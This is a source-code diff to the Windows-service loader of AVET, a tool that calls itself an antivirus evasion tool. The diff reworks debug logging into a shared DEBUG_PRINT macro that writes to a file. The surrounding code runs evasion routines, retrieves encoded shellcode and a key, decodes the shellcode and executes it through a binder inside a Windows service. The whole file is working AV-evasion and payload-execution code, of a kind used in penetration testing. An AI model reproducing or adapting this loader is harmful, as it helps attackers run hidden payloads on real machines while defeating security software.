@@ -26,10 +26,12 @@ Web: https://github.com/govolution/avet
 //     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
 //         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"
 
+
 // +++ +++ +++
-// This is the main source to generate a windows service executable.
+// This is the main source to generate a windows service executable with AVET.
 // If you prefer to generate a "normal" windows executable, refer to avet.c instead.
 // +++ +++ +++
+
 
 #include <windows.h>
 #include <stdio.h>
@@ -39,6 +41,9 @@ Web: https://github.com/govolution/avet
 // Include static data (imported C arrays)
 // Defines for static retrieval are set in this file
 #include "static_data/static_data.include"
+
+// Redirect debugging output to logfile
+#define DEBUG_TO_FILE
 
 // Include debug_print macro, if set.
 #include "debug_print/debug_print.include"
@@ -61,41 +66,17 @@ Web: https://github.com/govolution/avet
 void ServiceMain(int argc, char **argv);
 void ControlHandler(DWORD request);
 int InitService();
-int WriteToLog(char *);
 
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hStatus;
 
 #define SLEEP_TIME 5000
-#define LOGFILE "C:\\avetdbg.txt"
-
-
-// No debug output on stdout, so logs are written to file
-#ifdef DEBUG
-	int WriteToLog(char *message) {
-		FILE *logfile;
-		logfile = fopen(LOGFILE, "a+");
-		if(logfile == NULL) {
-			return -1;
-		}
-		fprintf(logfile, "%s", message);
-		fclose(logfile);
-		return 0;
-	}
-	#ifdef DEBUG_PRINT
-		#undef DEBUG_PRINT
-	#endif
-
-	#define DEBUG_PRINT(x) WriteToLog(x)
-#else
-	#define DEBUG_PRINT(x) do {} while (0)
-#endif
 
 
 // Service initialization
 int InitService() {
 	int result;
-	result = WriteToLog("Starting AVET service...\n");
+	result = DEBUG_PRINT("Starting AVET service...\n");
 	return result;
 }
 
@@ -191,12 +172,12 @@ void ServiceMain(int argc, char **argv) {
 			
 	// Execute evasion functions
 	if(evasion_functions[0] == NULL) {
-		DEBUG_PRINT(("No evasion techniques applied.\n"));
+		DEBUG_PRINT("No evasion techniques applied.\n");
 	}	
 	
 	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
 		if(evasion_functions[i] != NULL) {	
-			DEBUG_PRINT(("Executing evasion function %d.\n", i));
+			DEBUG_PRINT("Executing evasion function %d.\n", i);
 			evasion_functions[i]("");
 		}
 	}	
@@ -210,13 +191,13 @@ void ServiceMain(int argc, char **argv) {
 	unsigned char *encoded_shellcode = get_shellcode(argv[1], &shellcode_size);
 	#endif
 	if(encoded_shellcode != NULL) {
-		DEBUG_PRINT(("Retrieved shellcode data, size is %d bytes.\n", shellcode_size));
+		DEBUG_PRINT("Retrieved shellcode data, size is %d bytes.\n", shellcode_size);
 		for(int i = 0; i < shellcode_size; i++) {
-			DEBUG_PRINT(("%02x ", encoded_shellcode[i]));
+			DEBUG_PRINT("%02x ", encoded_shellcode[i]);
 		}
-		DEBUG_PRINT(("\n\n"));
+		DEBUG_PRINT("\n\n");
 	} else {
-		DEBUG_PRINT(("No shellcode retrieved.\n"));
+		DEBUG_PRINT("No shellcode retrieved.\n");
 	}
 	
 	// Retrieve crypto key
@@ -228,30 +209,30 @@ void ServiceMain(int argc, char **argv) {
 	unsigned char *key = get_key(argv[2], &key_length);
 	#endif
 	if(key != NULL) {
-		DEBUG_PRINT(("Retrieved key data, key length is %d bytes.\n", key_length));
+		DEBUG_PRINT("Retrieved key data, key length is %d bytes.\n", key_length);
 		for(int i = 0; i < key_length; i++) {
-			DEBUG_PRINT(("%02x ", key[i]));
+			DEBUG_PRINT("%02x ", key[i]);
 		}
-		DEBUG_PRINT(("\n\n"));
+		DEBUG_PRINT("\n\n");
 	} else {
-		DEBUG_PRINT(("No key retrieved.\n"));
+		DEBUG_PRINT("No key retrieved.\n");
 	}
 		
 	// Decode shellcode
 	unsigned char* shellcode = (unsigned char *) malloc(shellcode_size);
-	DEBUG_PRINT(("Calling decode_shellcode...\n"));
+	DEBUG_PRINT("Calling decode_shellcode...\n");
 	decode_shellcode(encoded_shellcode, shellcode_size, key, key_length, shellcode);
-	DEBUG_PRINT(("Decoded shellcode: \n"));	
+	DEBUG_PRINT("Decoded shellcode: \n");	
 	for(int i = 0; i < shellcode_size; i++) {
-		DEBUG_PRINT(("%02x ", shellcode[i]));
+		DEBUG_PRINT("%02x ", shellcode[i]);
 	}
-	DEBUG_PRINT(("\n\n"));
+	DEBUG_PRINT("\n\n");
 	
 	// Bind and execute shellcode
-	DEBUG_PRINT(("Calling shellcode_binder...\n"));
+	DEBUG_PRINT("Calling shellcode_binder...\n");
 	shellcode_binder(shellcode);
 	
-	DEBUG_PRINT(("Execution finished.\n"));	
+	DEBUG_PRINT("Execution finished.\n");	
 		
 	
 	// Service worker loop
